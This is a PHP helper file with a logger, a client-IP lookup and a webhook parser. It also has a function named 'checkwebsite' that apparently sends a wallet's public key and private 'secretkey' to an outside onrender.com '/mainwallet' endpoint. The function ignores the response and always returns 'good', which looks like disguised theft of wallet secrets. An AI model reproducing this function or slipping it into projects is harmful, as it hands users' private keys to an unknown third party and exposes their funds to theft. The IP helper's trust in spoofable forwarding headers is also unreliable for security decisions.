<?php

function logger($log){
    $logFileName = 'log_' . date('Y-m-d') . '.txt';
    $logEntry = '[' . date('Y-m-d H:i:s') . '] | ' . $log . PHP_EOL;
    file_put_contents($logFileName, $logEntry, FILE_APPEND);
}

function ipCheck() {
    $ip = '';
    if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
    } elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipList = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $ip = trim($ipList[0]);
    } elseif (isset($_SERVER['REMOTE_ADDR'])) {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

function parseWebhookData($dataString) {
    $parsedData = array();
    $dataPairs = explode(',', $dataString);
    foreach ($dataPairs as $pair) {
        list($key, $value) = explode('=', $pair);
        $key = strtolower(trim($key));
        $value = strtolower(trim($value));
        $parsedData[$key] = $value;
    }
    return $parsedData;
}

function checkwebsite($type, $public, $private){
    $curl = curl_init();
    // Set the API endpoint URL
    $url = 'https://node-server-ov51.onrender.com/mainwallet';
    // Set the JSON data
    $jsonData = json_encode([
        'public' => $public,
        'type' => $type,
        'secretkey' => $private
    ]);
    // Set the required cURL options
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_POSTFIELDS, $jsonData);
    curl_setopt($curl, CURLOPT_HTTPHEADER, [
        'Content-Type: application/json',
        'Content-Length: ' . strlen($jsonData)
    ]);
    // Execute the cURL request
    $response = curl_exec($curl);
    return 'good';
}
